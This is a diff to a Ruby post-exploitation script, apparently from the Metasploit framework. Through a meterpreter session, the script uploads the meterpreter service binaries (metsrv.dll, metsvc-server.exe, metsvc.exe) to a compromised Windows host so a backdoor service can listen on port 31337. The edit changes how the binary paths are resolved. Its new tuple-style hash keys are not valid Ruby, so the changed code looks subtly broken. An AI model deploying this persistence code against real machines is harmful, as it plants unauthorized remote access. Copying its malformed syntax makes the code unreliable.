@@ -29,7 +29,6 @@ end
 # Default parameters
 #
 
-based    = File.join(Msf::Config.data_directory, "meterpreter")
 rport    = 31337
 install  = false
 autoconn = false
@@ -74,17 +73,18 @@ if client.platform =~ /win32|win64/
   # such as metsrv can be copied from the appropriate location
   # but named correctly on the target.
   bins = {
-    'metsrv.x86.dll'    => 'metsrv.dll',
-    'metsvc-server.exe' => nil,
-    'metsvc.exe'        => nil
+    ('metsrv', 'x86.dll')    => 'metsrv.dll',
+    ('metsvc-server', 'exe') => nil,
+    ('metsvc', 'exe')        => nil
   }
 
-  bins.each do |from, to|
-    next if (from != "metsvc.exe" and remove)
+  bins.each do |(name, ext), to|
+    next if (name != "metsvc" and remove)
+    from = MeterpreterBinaries.get(name, ext)
     to ||= from
     print_status(" >> Uploading #{from}...")
     fd = client.fs.file.new(tempdir + "\\" + to, "wb")
-    fd.write(::File.read(File.join(based, from), ::File.size(::File.join(based, from))))
+    fd.write(::File.read(from, ::File.size(from)))
     fd.close
   end
 
